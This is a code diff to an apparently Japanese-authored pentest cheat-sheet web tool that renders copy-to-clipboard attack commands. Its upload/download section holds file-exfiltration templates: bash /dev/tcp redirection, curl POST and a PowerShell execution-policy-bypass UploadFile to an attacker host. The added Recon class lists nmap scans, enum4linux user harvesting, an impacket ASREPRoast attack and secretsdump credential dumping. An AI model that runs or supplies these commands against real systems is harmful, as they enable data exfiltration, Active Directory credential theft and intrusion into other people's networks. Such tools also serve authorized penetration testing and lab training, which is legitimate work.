@@ -32,6 +32,28 @@ $(function () {
   upDown.STORAGE_KEY = STORAGE_KEY;
   upDown.setup(updownlhost, updownlport, updownfilename);
   upDown.draw(updownlhost, updownlport, updownfilename);
+
+  // --- Setup recon list ---
+  STORAGE_KEY = 'RECON_ENV';
+  storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
+  const reconRhost = (storageInfo && storageInfo.RHOST) || '10.0.0.1';
+  const reconLport = (storageInfo && storageInfo.RPORT) || '4444';
+  const recon = new Recon('#mytoolRecon', ['#reconNmapList', '#reconLDAPList'], {
+    'RHOST': '#reconInputRHOST',
+    'RPORT': '#reconInputRPORT',
+    'SUBMIT': '#reconInputSubmit',
+  })
+  recon.STORAGE_KEY = STORAGE_KEY;
+  recon.setup(reconRhost, reconLport);
+  recon.draw(reconRhost, reconLport);
+
+
+  // URLのハッシュ(#以降の文字列)で初期表示ページの切り替え
+  const myTabButton = document.querySelector(`#myTab button[data-bs-target="${location.hash}"]`);
+  if (myTabButton) {
+    $(myTabButton).trigger('click');
+  }
+  
 });
 
 
@@ -110,12 +132,21 @@ class MyTool {
   }
 
   draw(...args) {
-    this.drawList(...args);
+    // 各リストの作成
+    let index = -1;
+    for (const key in this.targetContents) {
+      index += 1;
+      if (Object.hasOwnProperty.call(this.targetContents, key)) {
+        const targetContent = this.targetContents[key];
+        this.drawList(index, targetContent, ...args);
+      }
+    }
+    // 各リストの要素がクリックでコピーできるようにイベントリスナを設定する
     this.setupCopyItem(this.topCSSSelector);
   }
 
-  drawList(...args) {
-    throw new Error("Not Implemented Error!")
+  drawList(index, targetContent, ...args) {
+    throw new Error("Not Implemented Error!");
   }
 
   setupCopyItem(CSSSelector) {
@@ -159,8 +190,8 @@ class MyTool {
 
 // ---- Reverse Shell ----------------------------------------------------------
 class RevShell extends MyTool {
-  constructor(topCSSSelector, targetCSSSelectors, inputCSSSelectors) {
-    super(topCSSSelector, targetCSSSelectors, inputCSSSelectors);
+  constructor(...args) {
+    super(...args);
 
     // 1. Listen
     this.targetContents['1.Listen'] = [
@@ -208,57 +239,48 @@ class RevShell extends MyTool {
     ]
   }
 
-  drawList(lhost, lport) {
-    let i = -1;
-    for (const key in this.targetContents) {
-      i += 1;
-      if (Object.hasOwnProperty.call(this.targetContents, key)) {
-        const targetContent = this.targetContents[key];
+  drawList(index, targetContent, lhost, lport) {
+    for (let i = 0; i < targetContent.length; i++) {
+      const content = targetContent[i];
+      let title = content.title;
+      let cmd = "";
 
-        for (let j = 0; j < targetContent.length; j++) {
-          const content = targetContent[j];
-          let title = content.title;
-          let cmd = "";
-
-          if (content.base64 && content.cmd) {
-            // base64デコードしてcmdに埋め込む
-            let shell = atob(content.base64);
-            shell = shell.replace('{0}', htmlEscape(lhost));
-            shell = shell.replace('{1}', htmlEscape(lport));
-            cmd = content.cmd.replace('{0}', btoa(shell));
-          } else if (content.base64) {
-            // base64デコードする
-            cmd = atob(content.base64);
-            cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
-            cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
-          } else {
-            // コマンドそのまま
-            cmd = content.cmd;
-            cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
-            cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
-          }
-
-          // Template
-          $(this.targetCSSSelectors[i]).append(`
-          <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
-            <div class="ms-2 me-auto" style="width: 80%">
-              <div class="fw-bold">${title}</div>
-              <code class="copy_target">${cmd}</code>
-            </div>
-            <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
-          </li>
-          `);
-        }
+      if (content.base64 && content.cmd) {
+        // base64デコードしてcmdに埋め込む
+        let shell = atob(content.base64);
+        shell = shell.replace('{0}', htmlEscape(lhost));
+        shell = shell.replace('{1}', htmlEscape(lport));
+        cmd = content.cmd.replace('{0}', btoa(shell));
+      } else if (content.base64) {
+        // base64デコードする
+        cmd = atob(content.base64);
+        cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
+        cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
+      } else {
+        // コマンドそのまま
+        cmd = content.cmd;
+        cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
+        cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
       }
-    }
 
+      // Template
+      $(this.targetCSSSelectors[index]).append(`
+      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
+        <div class="ms-2 me-auto" style="width: 80%">
+          <div class="fw-bold">${title}</div>
+          <code class="copy_target">${cmd}</code>
+        </div>
+        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
+      </li>
+      `);
+    }
   }
 }
 
 // --- Upload and Download -----------------------------------------------------
 class UpDown extends MyTool {
-  constructor(topCSSSelector, targetCSSSelectors, inputCSSSelectors) {
-    super(topCSSSelector, targetCSSSelectors, inputCSSSelectors);
+  constructor(...args) {
+    super(...args);
 
     // LHOST: {0}, LPORT: {1}, FILE: {2}
     this.targetContents[0] = [
@@ -276,44 +298,76 @@ class UpDown extends MyTool {
     this.targetContents[1] = [
       {'title': '1. @Kali (bash)', 'cmd': 'nc -lvnp {1} > {2}'},
       {'title': '1. bash', 'cmd': 'cat {2} > /dev/tcp/{0}/{1}'},
-      {'title': '2. @Kali (curl)', 'cmd': 'wget https://gist.githubusercontent.com/touilleMan/eb02ea40b93e52604938/raw/b5b9858a7210694c8a66ca78cfed0b9f6f8b0ce3/SimpleHTTPServerWithUpload.py; python3 SimpleHTTPServerWithUpload.py'},
+      {'title': '2. @Kali (curl)', 'cmd': 'wget https://gist.githubusercontent.com/touilleMan/eb02ea40b93e52604938/raw/b5b9858a7210694c8a66ca78cfed0b9f6f8b0ce3/SimpleHTTPServerWithUpload.py'},
+      {'title': '2. @Kali (curl)', 'cmd': 'python3 SimpleHTTPServerWithUpload.py'},
       {'title': '2. curl', 'cmd': 'curl {0}:{1} -X POST -F file=@{2}'},
-      {'title': '3. @Kali (powershell)', 'cmd': 'wget https://gist.githubusercontent.com/touilleMan/eb02ea40b93e52604938/raw/b5b9858a7210694c8a66ca78cfed0b9f6f8b0ce3/SimpleHTTPServerWithUpload.py; python3 SimpleHTTPServerWithUpload.py'},
+      {'title': '3. @Kali (powershell)', 'cmd': 'python3 SimpleHTTPServerWithUpload.py'},
       {'title': '3. powershell', 'cmd': `powershell -exec bypass -command "(New-Object System.Net.WebClient).UploadFile('http://{0}:{1}','{2}')"`},
     ];
   }
 
-  drawList(lhost, lport, filename) {
-    let i = -1;
-    for (const key in this.targetContents) {
-      i += 1;
-      if (Object.hasOwnProperty.call(this.targetContents, key)) {
-        const targetContent = this.targetContents[key];
-
-        for (let j = 0; j < targetContent.length; j++) {
-          const uploadCmd = targetContent[j];
-          let title = uploadCmd.title;
-          let cmd = uploadCmd.cmd;
-          cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
-          cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
-          cmd = cmd.replaceAll('{2}', `<span class="bg-warning">${htmlEscape(filename)}</span>`);
-          // Template
-          $(this.targetCSSSelectors[i]).append(`
-          <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
-            <div class="ms-2 me-auto" style="width: 80%">
-              <div class="fw-bold">${title}</div>
-              <code class="copy_target">${cmd}</code>
-            </div>
-            <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
-          </li>
-          `);
-        }
-      }
+  drawList(index, targetContent, lhost, lport, filename) {
+    for (let i = 0; i < targetContent.length; i++) {
+      const uploadCmd = targetContent[i];
+      let title = uploadCmd.title;
+      let cmd = uploadCmd.cmd;
+      cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
+      cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
+      cmd = cmd.replaceAll('{2}', `<span class="bg-warning">${htmlEscape(filename)}</span>`);
+      // Template
+      $(this.targetCSSSelectors[index]).append(`
+      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
+        <div class="ms-2 me-auto" style="width: 80%">
+          <div class="fw-bold">${title}</div>
+          <code class="copy_target">${cmd}</code>
+        </div>
+        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
+      </li>
+      `);
     }
   }
 }
 
+// ---- Reconnaissance ----------------------------------------------------------
+class Recon extends MyTool {
+  constructor(...args) {
+    super(...args);
 
+    this.targetContents['1.nmap'] = [
+      {'title': 'nmap', 'cmd': 'nmap -T4 -A -v {0}'},
+      {'title': 'nmap', 'cmd': 'nmap -sC -sV -O -n -o nmapscan.txt {0}'},
+      {'title': 'nmap', 'cmd': 'nmap -sC -sV -p{1} "{0}" -o nmapscan.txt'},
+    ];
+
+    this.targetContents['LDAP'] = [
+      {'title': 'nmap', 'cmd': 'nmap --script=ldap-search {0}'},
+      {'title': 'enum4linux', 'cmd': 'enum4linux {0}'},
+      {'title': 'enum4linux (extracting users)', 'cmd': `enum4linux {0} | grep -E '^user:' | cut -d "[" -f 2 | cut -d "]" -f 1 > users.txt`},
+      {'title': 'impacket (ASREPRoast Attack)', 'cmd': 'python3 GetNPUsers.py $DOMAIN/ -usersfile "users.txt" -format john -outputfile "GetNPUsers.result"'},
+      {'title': 'impacket secretsdump', 'cmd': 'python3 secretsdump.py $DOMAIN/$USERNAME:$PASSWORD@{0}'},
+    ]
+  }
+
+  drawList(index, targetContent, rhost, rport) {
+    for (let i = 0; i < targetContent.length; i++) {
+      const uploadCmd = targetContent[i];
+      let title = uploadCmd.title;
+      let cmd = uploadCmd.cmd;
+      cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(rhost)}</span>`);
+      cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(rport)}</span>`);
+      // Template
+      $(this.targetCSSSelectors[index]).append(`
+      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
+        <div class="ms-2 me-auto" style="width: 80%">
+          <div class="fw-bold">${title}</div>
+          <code class="copy_target">${cmd}</code>
+        </div>
+        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
+      </li>
+      `);
+    }
+  }
+}
 
 
 function htmlEscape(str) {
